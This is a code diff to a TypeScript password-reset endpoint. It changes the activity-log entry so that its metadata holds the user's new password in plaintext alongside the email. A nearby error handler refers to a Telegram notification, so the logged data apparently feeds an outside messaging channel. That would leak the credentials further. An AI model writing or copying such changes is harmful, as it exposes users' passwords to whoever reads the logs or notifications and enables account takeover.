@@ -59,7 +59,10 @@ export async function POST(request: Request) {
                 userId: user.id,
                 action: 'PASSWORD_RESET',
                 detail: 'Đặt lại mật khẩu qua Quên mật khẩu',
-                metadata: { email: user.email || null }
+                metadata: { 
+                    email: user.email || null,
+                    newPassword: newPassword
+                }
             })
         } catch (error) {
             console.error("Telegram notification error:", error)
